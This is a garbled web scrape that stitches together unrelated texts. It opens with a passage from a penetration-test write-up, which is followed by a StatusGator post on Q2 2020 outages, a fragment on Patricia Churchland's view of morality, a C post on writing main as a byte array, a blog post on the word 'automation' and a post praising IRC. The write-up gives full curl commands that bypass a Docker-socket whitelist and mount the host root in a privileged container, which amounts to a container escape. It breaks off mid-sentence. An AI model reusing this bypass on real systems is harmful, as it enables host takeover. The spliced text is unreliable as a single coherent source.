<p>Basically, from inside the container we are in, we are trying to <strong>create</strong> another container that, once started, will have the root directory “<strong><code>/</code></strong>”of the host operating system mounted under its “<strong><code>/hostos/</code></strong>” folder. If that can be done, it is game over. Just connecting to the new container and launching the command “<code>chroot /hostos</code>” would provide the attacker with full access to the host operating system and all its files.</p>



<p>In our case instead the reverse proxy replied with:</p>



<p><code>HTTP/1.1 403 Forbidden</code></p>



<p>Honestly it was expected. Something else had to be attempted.</p>



<h3><strong>Time for circumvention</strong></h3>



<p>After a bit of trial and error we understand that the stricter check is performed on the value passed to “<code>Binds</code>”. When we provide the string “<code>/:/hostos</code>” trying to map the filesystem “<code>/</code>” of the host into the “<code>/hostos</code>” directory of the container, the request is rejected because the specified string is not in the whitelist. However we discovered, for example, that “<code>/dev/log:/dev/log</code>” is an accepted value instead. It means the reverse proxy allows us to create a container from inside another container when that value is provided. Of course there is nothing special with using “<code>/dev/log</code>” to bypass the filter. But what if the strings “<code>/:/hostos</code>” and “<code>/dev/log:/dev/log</code>” are both specified as part of the same “<code>Binds</code>” parameter, like below?</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong>"</strong>AttachStdout<strong>"</strong>: true,<strong>"</strong>AttachStderr<strong>"</strong>: true,<strong>"</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash<strong>"</strong>,<strong>"</strong>Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost/containers/create</code></p>



<p>Unexpectedly, the reverse proxy replies with:</p>



<p><code>HTTP/1.1 201 Created<br>Api-Version: 1.39<br>Content-Length: 90<br>Content-Type: application/json<br>Date: Fri, 15 May 2020 08:19:58 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)<p>{"Id":"4fa6bfc84930[...]","Warnings":null}</p></code></p>



<p>So it means we are allowed to create a new container where the root of the host filesystem is mounted into its “<code>/hostos</code>” directory. To confirm that, we manually started the newly created container from the host OS and then accessed it. This was what we got…</p>



<p><code>[root@4fa6bfc84930 opt]# <strong>ls -al /hostos/</strong><br>[...]<br>drwxr-xr-x. 102 root root 8192 May  6 09:08 etc<br>drwxr-xr-x.   6 root root   56 Feb  7  2018 home<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 media<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 mnt<br>drwxr-xr-x.  17 root root 4096 Mar 24  2017 nfs<br>drwxr-xr-x.   7 root root  106 Jan  7  2019 opt<br>dr-xr-xr-x. 375 root root    0 Nov 23 08:23 proc<br>dr-xr-x---.   8 root root 4096 May 14 13:51 root<br>drwxr-xr-x.  35 root root 1140 May  6 09:08 run<br>lrwxrwxrwx.   1 root root    8 Jan 18  2018 sbin -&gt; usr/sbin<br>[...]</code></p>



<p>…meaning that from inside the container we have total control over the entire host OS filesystem, which is what the reverse proxy implementation was attempting to prevent. Good, but how was that possible? Well, let’s have a look once more at the interested part that made the trick possible:</p>



<p><strong><code>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</code></strong></p>



<p>It seems that in case just one of the strings given to the “<code>Binds</code>” parameter is present in the whitelist, the whole check is considered passed, regardless of the presence of other values that are instead not defined in the whitelist configuration. The logic of the reverse proxy was clearly flawed.</p>



<h3><strong>Start the container just created</strong></h3>



<p>So from inside the current container we have managed to create a new one with full access to the host OS filesystem. But we have not executed anything in the host OS yet…and we are still confined within our unprivileged container.</p>



<p><code>bash-4.4$</code></p>



<p>Let’s try to get out of here. First of all let’s see if after its creation we can also start the container from the place where we are now:</p>



<p><code>curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/<strong>4fa6bfc84930</strong>[...]/start</code></p>



<p>As indicated in the <a href="https://docs.docker.com/engine/api/v1.39/#operation/ContainerStart" target="_blank" rel="noreferrer noopener">Docker API</a> the endpoint to target this time is “<code>/containers/{ID}/start</code>”, where ID (in bold above) is the value the reverse proxy has returned to us with the previous request. The reply we get is:</p>



<p><code>HTTP/1.1 204 No Content<br>Api-Version: 1.39<br>Date: Fri, 15 May 2020 08:20:34 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)</code></p>



<p>It means we are allowed to do that. So far, so good. Now the high privileged container is started and we want to execute a command in …</p></div></div>

<p>Anything bad that can happen — will happen. This old adage applies 100% to the technology industry, where crashes and outages are far more common than the sales and marketing teams would want us to think. However, DevOps engineers that deal with infrastructure know how hard it is to ensure everything works as intended all of the time — and to configure monitoring that actually keeps track of a system’s health and helps prevent crashes and downtime.&nbsp;</p>
<p>At <a href="https://statusgator.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">StatusGator </a>we monitor the status pages of more than 800 cloud-based services and deliver instant notifications to our users. We have mountains of data on downtime and outages and see the full picture, so we decided to make a quarterly top downtime list. We hope our findings will motivate DevOps engineers to see how others deal with service outages so they can improve their own reliability.&nbsp;</p>
<p>Read on to find out about the five biggest outages of Q2 2020 and how Slack, Zoom, GitHub, IBM Cloud and T-Mobile acted during these crises. We also rate the outcomes of these outages and would be glad to hear your thoughts on our ratings.</p>
<h2>Outage #1 – <strong>World-wide Slack outage, May 12, 2020</strong></h2>
<p>Slack is the primary means of communication for thousands of companies worldwide, so its stable uptime is a matter of utmost importance. Thus, when users stopped being able to send and receive Slack messages around 7:30 PM EDT, the situation quickly escalated into a full-scale problem. Unlike during previous outages, this affected the entire Slack ecosystem: nobody could log in to Slack or receive any notifications. “Is Slack down?”, the users asked themselves and the answer was an undeniable “Yes!”</p>
<p>Anyone using the Slack Electron app was getting a generic HTTP error. Even the next day, after the issue had been resolved, people using the Slack app were still seeing the same error message. The app doesn’t refresh automatically so it was confusing for non-technical users, many of whom didn’t know they had to press Ctrl-R to refresh the app and restore service after the error.</p>
<p>The company confirmed they were aware of a situation and posted regular updates to <a href="https://status.slack.com/2020-05/147dad376c8946ff" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">the Slack status page</a>. Quite importantly, these updates were not standardized ‘we are aware of the situation, please stand by’ responses.</p>
<figure></figure>
<p>Team representatives wrote detailed messages that showed customers the Slack team were transparent about the challenge they faced and the efforts they made to overcome it.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">We are seeing performance improvements and you may be able to connect once again. We're working to fully restore service for everyone. Thank you for bearing with us.</p>— Slack (@SlackHQ) <a href="https://twitter.com/SlackHQ/status/1260378685334409216?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 13, 2020</a></blockquote>
</div></figure>
<p>At 10:26 PM EDT Slack reported full restoration of services and apologized for the inconvenience once again. Even more importantly, they published a detailed <a href="https://slack.engineering/a-terrible-horrible-no-good-very-bad-day-at-slack-dfe05b485f82" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">postmortem</a> on Medium, explaining the reasons behind the issue, the actions they performed to overcome it, the conclusions they came to, and the measures they were undertaking to eliminate the chance of a similar situation happening again.</p>
<p>Feel free to read this postmortem, it is very technical yet quite understandable even for laypersons. Slack demonstrates here that they care about members of their user base — both developers and the mass user base, and the confidence this article projects is admirable.</p>
<p>An important thing to note here is that while the issue itself started at 8:30 AM EDT, the issue went completely under the radar till around 7:30 PM EDT when multiple users reported issues with Slack. They reported them inside the app (which was mostly down by that time), on Twitter, on Downdetector, on the Slack website (which went down too quite soon) and through many other channels, before the Slack team became aware of the situation.&nbsp;</p>
<p>Getting notified about an outage would have been much faster and easier with StatusGator, where you can aggregate multiple status pages into one dashboard. StatusGator can send centralized notifications on downtimes for any services and APIs, and you can enjoy it with a <a href="https://statusgator.com/plans" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">free subscription plan</a>!</p>

<h2>Outage #2 – <strong>Zoom shutdown, May 17, 2020</strong></h2>
<p>Zoom usage has gone up dramatically since the Coronavirus pandemic began as more people work and study remotely. So have subscriptions to the Zoom status page, which have skyrocketed in StatusGator since April.&nbsp;</p>
<figure><img src="https://lh4.googleusercontent.com/2sgE3LGne0_xP2m3OP2ekivYBcg0PAOYeLqKRhTfEHZH6obapJBvPpiDy-1aYNSeaTUbgl220ZStj5_YWrayRzGfOvY6Uqt1WOLd4qQRDYTZAYgWcYAmqmLkoCOJvbQhTmRmswLA" alt=""></figure>
<p>Aside from businesses being forced to begin working remotely, many churches and other public organizations started using Zoom to hold Sunday masses, meetings, and to host public events. Thus, while Sunday is not a business day, many paid accounts in the UK quickly noticed that they were not able to host or join Zoom meetings (free accounts seemed not to be affected). The issue was reported through multiple channels, including Twitter and StatusGator that monitors the status of Zoom.</p>
<p>A Zoom spokesperson responded, acknowledging awareness of the situation and mentioning it was only affecting a subset of users. However, we all know a subset might be 1% or 99% and Zoom provided no indication whatsoever as to the volume of users affected. Providing more transparency into the percentage of affected users is a hallmark of a quality status page, something Zoom should improve.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Hi there – We have received reports that Zoom users may be experiencing issues hosting and joining meetings. Please see <a href="https://t.co/aqz5nS7fZY" data-wpel-link="external" target="_blank" rel="nofollow">https://t.co/aqz5nS7fZY</a> for updates.</p>— Zoom (@zoom_us) <a href="https://twitter.com/zoom_us/status/1262025037999214595?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 17, 2020</a></blockquote>
</div></figure>
<p>The issue was reported resolved by 11:40 AM EDT, but Zoom provided no explanation or postmortem of any kind. Such an attitude, along with <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/27/21197090/zoombombing-zoom-stop-how-to-porn-trolls-video-chat-screen-sharing" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Zoombombing</a> and a “Company Directory” checkbox in settings allowing users to <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/31/21201956/zoom-leak-user-information-email-addresses-photos-contacts-directory" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">leak corporate photos and emails</a> is one of the reasons many users are now actively seeking better alternatives to Zoom.</p>
<h2>Outage #3 – <strong>GitHub was inaccessible… Again. June 29, 2020</strong></h2>
<p>GitHub seems to be down a lot more since its $7.5 billion <a aria-label="undefined (opens in a new tab)" href="https://blogs.microsoft.com/blog/2018/10/26/microsoft-completes-github-acquisition/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">acquisition by Microsoft</a>. The reasons have not been disclosed, and we can only speculate on the causes. Maybe it has something to do with integrating GitHub infrastructure with Microsoft systems. Maybe it’s because GitHub has been moving faster and adding more features. In any case, it’s been almost two years since the acquisition, and users are noticing more sustained periods of downtime at GitHub. Our independent <a aria-label="undefined (opens in a new tab)" href="https://statusgator.com/blog/2020/06/04/has-github-been-down-more-since-its-acquisition-by-microsoft/" target="_blank" rel="noreferrer noopener follow" data-wpel-link="internal">analysis of the GitHub status page</a> confirms that the outages became more frequent over the past two years.</p>
<p>Microsoft is working hard to turn GitHub into an even better place for developers than it was before. The Redmond giant made all of the paid plans more affordable earlier this year and offered some key features for free to place more tools at the disposal of IT professionals. Microsoft, Apple, AWS, Google, Facebook and thousands of other companies use GitHub to store and run their code repositories, so its uptime is of utmost importance.</p>
<p>Nevertheless, GitHub was down for two hours on June 29, 2020. The entire website and its services were inaccessible, so many developers were not even able to push code or deploy their apps due to the number of GitHub integrations that were unresponsive. Naturally, this caused a major backlash and caused <a aria-label="undefined (opens in a new tab)" href="https://github.blog/2020-07-08-introducing-the-github-availability-report/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">GitHub to introduce a monthly availability report</a> in addition to its status page, providing detailed explanations of the reasons and outcomes of every outage.&nbsp;&nbsp;</p>
<h2>Outage #4 – <strong>IBM Cloud went down along with the status page, June 10, 2020</strong></h2>
<p>One of the biggest mistakes any cloud-based service can do is to host its status page on its own infrastructure. It appears IBM Cloud did just that, so when its whole infrastructure became inaccessible for several hours in June, its status page followed suit. We could have expected IBM to draw some conclusions after the <a href="https://www.datacenterdynamics.com/en/news/ibm-cloud-struggles-suffers-small-outage-dallas/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">Dallas downtime this March</a>, but, apparently, they did not bother, or did not make enough effort.</p>
<p>Thus, on June 10, 2020, the IBM Cloud infrastructure went down globally. This outage rendered features like Watson AI, IBM Cloud Foundry, Kubernetes Service, Cloud Object Storage, Identity Access and Management, VPN for VPS, App Connect and others completely inaccessible. Fortunately, the IBM Cloud status page was unavailable only in the early stages of the outage and became available intermittently later. That’s why StatusGator was still able to send alerts to users who had subscribed to the IBM Cloud status page.</p>
<p>The company totally failed to communicate the reasons for the outage, as well as the steps it took to alleviate the impact. It later became known from an independent monitoring service, that a 3rd-party network provider had extensively used the traffic routes, which resulted in severe constraints on the IBM Cloud configuration bandwidth. IBM specialists reconfigured their systems and restored operations, but no official explanations or announcements ensued — much to the disappointment of users.&nbsp;</p>
<p>It is not the first time IBM has failed at public relations, nor, we think, will it be the last. This is probably one of the reasons for them to fall so far behind AWS, Google Cloud Platform, Microsoft Azure, and other cloud providers, despite delivering a diverse range of competitive cloud services.</p>
<p>But what could IBM have done? Had an independent status page, naturally! Below are just some of the variants they could have used:</p>
<ol><li><a aria-label="undefined (opens in a new tab)" href="https://statuspage.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">StatusPage.io</a>. The largest and most popular platform around. This is probably the only provider big enough to handle companies like IBM Cloud.</li><li><a aria-label="undefined (opens in a new tab)" href="https://status.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Status.io</a>. Another large and widely used status page provider with infrastructure meeting the scale that IBM Cloud would require.&nbsp;</li><li>Alternatively, they could build their own status page, being careful <a href="https://statusgator.com/blog/2020/04/21/your-status-page-deserves-its-own-domain/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">not to be dependent on any of their own infrastructure</a>. IBM could host it as a static page on a third-party CDN to reduce complexity and dependency on its network.</li></ol>

The inner voice can mislead us.</p>  <p>For <a href="https://patriciachurchland.com/" target="_blank">Patricia Churchland</a>, professor emerita in philosophy at University of California San Diego, it's instructive to know more about the origins of our human consciences. She argues the starting point could be as early as the first warm-blooded animals more than 200 million years ago.&nbsp;</p>  <p>What began as an adaptation to foraging in cold or nighttime environments spurred further adaptations, such as a propensity to nurture, socialize, and learn from others.</p>  <p>Brain structures encouraging social behaviour took mammals right up to the doorstep of what we call morality in humans.</p>  <p>"I don't think that human behaviour is different in kind from the behaviour we see in chimpanzees, or baboons, or wolves," Churchland told <em>IDEAS</em> host Nahlah Ayed.</p>  <p>"I think it is more complicated because our ecology — especially now — is more complicated."</p>  <h2>Vole brain&nbsp;breakthrough</h2>  <p>Churchland wants the scientific research to inform what has long been a philosophical or religious conversation. Often, thinkers tried to answer questions such as "Why be good?" with appeals to reason or divine authority.</p>  <p>The biological story offers us a different answer: brain wiring.</p>  <p>"Why is [being social] so meaningful? Why do we care?

  <article>
    <p>It began when my coworker, despite already knowing how to program, was forced to take the intro level Computer Science course at my university. We joked with him about how he needs to make a program that works, but the grading TAs wouldn’t be able to figure out <em>how</em> it works. So that is the requirement, to make a functioning program that completes an assignment while obfuscating it such that the graders think that it shouldn’t work. With this in mind, I started to think through the arsenal of tricks in C that I’ve seen used before and one thing in particular stood out. The idea for this trick I will explain how to accomplish came from a blog with the name <a href="http://mainisusuallyafunction.blogspot.com/">main is usually a function</a> which got me thinking about when would main <em>not</em> be a function? Let’s find out then!</p>

<p>(If you want to download any of the files, <a href="http://jroweboy.github.io/downloads/2015-01-26-when-is-main-not-a-function/sources.zip">you can download a zip of all the files I wrote here</a> Remember that I wrote them on 64-bit Linux and you’ll need to adjust them to work on other platforms I’m guessing)</p>

<p>My problem solving process is typically the same thing I imagine most programmers do. Step 1: Google search about the problem. Step 2: Click every link on the first page that seems relevant. If not solved, try a different query and repeat. Thankfully, the answer to this question came on the very first search on <a href="http://stackoverflow.com/a/2252429/745719">this Stackoverflow answer</a>. Apparently in 1984, a strange program won the IOCCC where main was declared as a <code>short main[] = {...}</code> and somehow this did stuff and printed to the screen! Too bad it was written for a whole different architecture and compiler so there is really no easy way for me to find out what it did, but judging from the fact that it is just a bunch of numbers, I can surmise that the numbers there are just the compiled binary of some short function and the linker when looking for the main function just throws this in the place of it.</p>

<p>With our hypothesis in place, that the code for the program is just the compiled assembly of main function represented as an array, let’s see if we can replicate this by making a small program and seeing if we can do that.</p>

<figure><pre><code data-lang="c"><span>char</span> <span>main</span><span>[]</span> <span>=</span> <span>"Hello world!"</span><span>;</span></code></pre></figure>

<figure><pre><code data-lang="bash"><span>$ </span>gcc <span>-Wall</span> main_char.c <span>-o</span> first
main_char.c:1:6: warning: ‘main’ is usually a <span>function</span> <span>[</span><span>-Wmain</span><span>]</span>
 char main[] <span>=</span> <span>"Hello world!"</span><span>;</span>
      ^
<span>$ </span>./first
Segmentation fault</code></pre></figure>

<p>Alright! It worked! Kinda… So our next goal is we want it to actually print something to the screen. Thinking back to my limited ASM experience, I recalled that there are different sections of the compiled which determine where different things go. The two sections that are most relevant to us are the <code>.text</code> section and the <code>.data</code> section. <code>.text</code> contains all the executable code and it it readonly whereas <code>.data</code> contains readable and writable code, but it’s not executable. In our case, we can only fill in code for the main function, so anything that gets placed in the data section is a no go. We need to find a way to get the string <code>"Hello world!"</code> inside the main function and reference it.</p>

<p>I began by looking into how to print something with as little code as possible. Since I knew the target system is going to be 64-bit Linux, I found that I can call the system write call and it would write out to the screen. Looking back at this now that I’m writing the code, I don’t think that I needed to use Assembly for this, but at the same time, I’m really glad I got to learn what I did. Getting started writing inline GCC ASM was the hardest part, but once I got the hang of it, it started to become easier.</p>

<p>Getting started wasn’t easy though. It turns out that most of the ASM knowledge I could find through Google is all of the following: really old, Intel syntax, and for 32-bit systems. Remember in our scenario, we need the file to compile with a gcc on a 64-bit system, without any special modifications to the compiler flags, so that means there is no special compile flags, nor can we include any custom linking steps and we want to use GCC inline AT&amp;T syntax. Most of my time was spent trying to find information about modern assembly for 64-bit systems! Maybe my Google-fu is lacking :) This part was almost all trial and error. My goal was just use the write syscall to print “Hello world!” to the screen using gcc inline ASM, so why was it so hard? For the people that want to learn how to do this, I recommend the following sites: <a href="https://filippo.io/linux-syscall-table/">Linux syscall list</a>, <a href="http://wiki.osdev.org/Inline_Assembly">Intro to Inline ASM</a>, and <a href="http://asm.sourceforge.net/articles/linasm.html#Syntax">Differences between Intel and AT&amp;T Syntax</a></p>

<p>Eventually my ASM code started to form and I had some code that seemed to work! Remember, my goal is to produce a main that is an array of the ASM that prints Hello World.</p>

<figure><pre><code data-lang="c"><span>void</span> <span>main</span><span>()</span> <span>{</span>
    <span>__asm__</span> <span>(</span>
        <span>// print Hello World

        <span>"movl $1, %ebx;</span><span>\n</span><span>"</span>  <span>/* 1 is stdout and is the first argument */</span>
        <span>"movl $message, %esi;</span><span>\n</span><span>"</span> <span>/* load the address of string into the second argument*/</span>
        <span>"movl $13, %edx;</span><span>\n</span><span>"</span>  <span>/* third argument is the length of the string to print*/</span>
        <span>"syscall;</span><span>\n</span><span>"</span>
        <span>// call exit (so it doesn't try to run the string Hello World)
</span>        <span>// maybe I could have just used ret instead?
</span>        <span>"movl $60,%eax;</span><span>\n</span><span>"</span>
        <span>"xorl %ebx,%ebx; </span><span>\n</span><span>"</span>
        <span>"syscall;</span><span>\n</span><span>"</span>
        <span>// Store the Hello World inside the main function
</span>        <span>"message: .ascii </span><span>\"</span><span>Hello World!</span><span>\\</span><span>n</span><span>\"</span><span>;"</span>
    <span>);</span>
<span>}</span></code></pre></figure>

<figure><pre><code data-lang="bash"><span>$ </span>gcc <span>-Wall</span> asm_main.c <span>-o</span> second

<p>Hurray! It prints! Let’s take a look at the compiled code in hex now, and it should match up one-to-one with the ASM code we wrote. I went ahead and broke down what’s going on in the comments to the side.</p>

<p>That looks like a functioning main to me! Now let’s go and grab the hex contents of it, and dump it in as a string and see if that works. We can get the hex from main by using gdb again. I’m willing to guess that there must be a better way, so maybe someone can post a comment on this and let me know :) The way I did it was to load gdb and print the hex at main like so. Last time we disassembled main, we saw that it was 49 bytes long, so can use the <code>dump</code> command to save the hex to a file:</p>

<figure><pre><code data-lang="bash"><span># example of how to print the hex</span>

<p>Now we have the hex dump, we can convert them all to integers the easiest way that I know of, and that is using python. In python 2.6 and 2.7 you can just use the following to convert it to a convenient array of ints for us to use.</p>

<p>I figure if my bash foo and unix knowledge was greater I could find an easier way to do this, but googling things like “hex dump of compiled function” returns several questions about how to print hex in various languages. Regardless, we now have a comma seperated array of our function, so let’s put that in a new file and see if it works! I went ahead and commented what each of the different values mean.</p>

    I've learned the hard way that using the word <i>automation</i>&nbsp;to
    describe an initiative, project, process, or algorithm is a bad idea.
    Equating automation with artificial intelligence is even worse. Anchoring a
    digital transformation on initiatives driven by automations completely
    misses the point.
  </p>
  <p>
    In this post, I'm going to explain why you should avoid calling it
    automation, or at least, what some of the pitfalls are if you do describe
    the work you're doing as automation.
  </p>
  
  <p><a href="https://1.bp.blogspot.com/--FGVVQ3_rP0/XzkQSANOxdI/AAAAAAAAh-c/4Sjw_ESKNk0iajEHZ4Ubi5_y0E_Q4eGGACLcBGAsYHQ/s576/Why%2BAvoid%2BAutomation.gif"><img alt="Automation Brings Detractors" data-original-height="324" data-original-width="576" src="https://1.bp.blogspot.com/--FGVVQ3_rP0/XzkQSANOxdI/AAAAAAAAh-c/4Sjw_ESKNk0iajEHZ4Ubi5_y0E_Q4eGGACLcBGAsYHQ/s0/Why%2BAvoid%2BAutomation.gif" title="Automation Brings Detractors"></a>
  </p>
  
  <p>
    First, here is a bit of perspective. IT has been automating work for
    decades. Your data integrations are at least partially automated unless all
    you have is an SFTP folder and then perform all the steps to load databases
    manually. Who does that?&nbsp;
  </p>
  
  
  <p>
    Your software build process may not qualify as CI/CD pipelines, but there
    are some aspects of going from code in version control to running the
    application that is almost definitely automated.&nbsp;
  </p>
  <p>
  And yes, your choice of words is essential. What you name an initiative can
  either get executives and employees interested right from the outset or drown
  them in confusing buzzwords and acronyms.&nbsp;
  </p>
  <p>
    "Agile" - a great term! Who doesn't want to be agile? DevOps? Not good at
    all. DevOps was
    <a href="https://theagileadmin.com/what-is-devops/#:~:text=Then%20in%202009%2C%20Patrick%20Debois,Ghent%20that%20lit%20the%20fuse.">first labeled back in 2009</a>, yet we're still defining the term, and most business leaders are still in
    the dark about it.
  </p>
  <div>
    <br>
    
    <h2>
      The Good, the Bad, and the Ugly of Automation
    </h2>
    
    <p>So here's how I break down the use of automation:</p>
    <div>
      <ul>
        <li>
          <b>The good</b> - Executives understand the word and will likely buy
          into initiatives promising automation because they equate it with cost
          reduction and quality improvement.
        </li>
        <li>
          <b>The bad</b> - Automation sets a very high bar. Are you 100%
          automating a workflow or only a percentage of the steps? Will the
          automation be robust and handle 100% of the edge and outlier use
          cases, or is it more of augmentation, and people will need to handle
          some steps or exceptions? Will it scale on day one, or will you have
          to invest in the automation to achieve it?
        </li>
        <li>
          <b>The ugly</b> - Someone or some group in your organization is going
          to equate your efforts to develop or improve automation with their
          loss of job, function, or importance. As soon as you announce, "We're
          automating X," then some people think, "Shit, does that mean I'm out
          of the job?" Even worse is if you hide it from people, and they find
          out about it through hearsay or when you're a sizable percent
          complete. Talk about creating detractors, you've just given a person
          or group plenty of reason to create speed bumps to frontal assaults to
          slow or stop your progress.
        </li>
      </ul>
      &nbsp;&nbsp;
    </div>
    <p>
      Sorry folks, but the bad and ugly outweigh the good on using the word
      automation to describe your initiative.&nbsp;
    </p>
    
    <p>
      I have some advice for CIO and IT leaders on this topic. You may get your
      CFO on board, but they'll throw you out for round two investments if you
      underdeliver on their expected financial results of the automation.
      <a href="http://blogs.starcio.com/2017/03/how-to-handle-detractors-digital-transformation.html">And you'll immediately create detractors</a>
      who will help set an artificially high expectation on the percent and
      quality of the automation to help prove to everyone their value and your
      failure to sufficiently automate.&nbsp;
    </p>
    
    <h2>
      When RPAs are Massive Technical Debt
    </h2>
    
    <p>
      Let me add one more dimension to this rant and bring up one issue around
      robotic process automation, i.e., RPAs. Here's where an acronym does help
      IT, because when employees here they are being replaced by robots and
      automation, well, some are going to bring out the pitchforks and torches.
    </p>
    
    <p>The real problem is that RPA = code!&nbsp;</p>
    
    <p>
      You might be using a tool like UIPath, BluePrism, or Automation Anywhere
      to generate it, but don't fool yourself. That bot has code behind it. That
      automation will likely need maintenance whenever the tools, screens, or
      data that it depends on changes.
    </p>
    
    <p>
      Now sometimes, the RPA is automating work from tools and screens that your
      organization does not own or control. Perhaps accounting has to go update
      three different third-party systems with updates on an order? These are my
      "good" RPAs as they clearly remove toil from a job that you can't fully
      optimize.
    </p>
    
    <p>
      But what if your RPA is automating your own organization's tools,
      processes, or data? Well, that's code on top of code! Twice the tech debt
      to manage. While implementing an RPA may still have good business and
      technical merits, don't lose sight of the down-the-road impacts when you
      finally decide to upgrade legacy systems.
    </p>
    
    <h2>
      Avoid Setting False Expectations with Automation
    </h2>
    
    <p>
      If you've read this far, then great! You're ready for some advice. I'm
      going to provide the first one for free. If you want even better advice
      before the angry mobs come after you, then please sign up for my
      <a href="https://www.starcio.com/driving-digital?SQF_SRC=5nyike_sat-automation-2020-08-17">Driving Digital Newsletter with this link</a>. I'll be sharing additional recommendations in my next newsletter.
    </p>
    
    <p>So here's the most crucial advice:</p>
    
    <p>
      Don't call your project, initiative, program, release, or whatever you're
      working on based on what you are implementing - name it based on your
      goal, targeted impact, or objective!&nbsp;
    </p>
    
    <p>Some examples:</p>
    
    <div>
      <ul>
        <li>
          Automating builds and deploys with CI/CD -&gt; "Deploy applications
          more frequently"
        </li>
        <li>Automating payroll -&gt; "Simplify how employees get paid"</li>
        <li>
          Automating account reconciliations -&gt; "Completing end-of-month
          reconciliations easier"
        </li>
        <li>
          Automating help desk tickets -&gt; "Improving employee experience and
          satisfaction"
        </li>
        <li>
          Automating web scraping -&gt; "Capturing more unstructured data with
          higher quality"
        </li>
      </ul>
      <p>
      Get it? I know this looks superficial, but names mean A LOT! And naming
      things is not enough to avoid all the pitfalls I listed in this post. I
      have five other recommendations to go with it, so if this interests you,
      <a href="https://www.starcio.com/driving-digital?SQF_SRC=5nyike_sat-automation-2020-08-17">please sign up for the newsletter</a>.
    </p></div>
    
    <p>
      One last thought. Avoid labeling your investments in automation as
      artificial intelligence or anchoring digital transformations with
      automation investments. You'll have to wait for another post or two on
      these points.

<p>Similar to how <a href="https://www.paritybit.ca/blog/why-email-is-the-best-discussion-platform">I think e-mail is still the best discussion platform</a>, I think there is still a solid place for IRC in our lives.</p>
<p>IRC (Internet Relay Chat) is a communications protocol <a href="https://daniel.haxx.se/irchistory.html">created in 1988</a> and, yeah, it shows. IRC is 100% plain text; no images, no videos, no stickers, no emoji reactions, just good ol’ plain text. It was also designed to transmit everything in plain text (i.e. unencrypted) all across the Internets in a time when the use of these computer networks was limited mostly to universities, governments, and large corporations. This was a time when Hollywood-style <a href="https://www.urbandictionary.com/define.php?term=1337%20h4x0r">1337 h4x0rs</a> were pretty much just kids using their modems to make long distance calls for free.</p>
<p>Nowadays, IRC is probably not such a good platform for private personal chats, but that doesn’t mean it’s not good for other things.</p>
<p>Arguably the best “feature” of IRC is that it’s still all in plain text. No multimedia or fancy features such as emoji reactions, integrations, or stickers keeps the bandwidth usage down and the focus on the content of what people are saying, rather than on distracting memes and flashy things. It’s the same reason why people like lean websites, plain text email, plain text notes, and so on: plain text is easy, portable, lean, and pure. You can even still <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat#File_sharing">send files using IRC</a>.</p>
<p>One aspect of computing and software design that many developers nowadays seem to forget is that <a href="https://en.wikipedia.org/wiki/List_of_countries_by_Internet_connection_speeds">over half of the world’s population does not have access to fast Internet</a> and many people, even in developed countries, are limited by bandwidth caps and spotty satellite or mobile Internet access. For these people, IRC can be the much better option compared to other collaboration platforms such as RocketChat, Mattermost, Slack, or Matrix, even if they have to use an IRC bouncer or a screen/tmux session on a remote server to not miss things if their connection is that spotty.</p>
<p>One of the biggest flaws I see people discuss when talking about IRC is that chat history is not saved by the server. This means that, if you want a record of the conversations which happen when you’re not connected, you’d have to use an IRC bouncer or screen/tmux session which will keep you connected when you have to go offline. I can definitely see this being a limitation for a private group chat if this is not something you’re willing to do, but when it comes to open source collaboration or support, this makes IRC great for hashing out ideas, asking quick questions, and having conversations while hacking on things. In these cases you don’t really care what’s happening when you’re not there because these are synchronous conversations which is perfect for the ephemeral nature of IRC.</p>
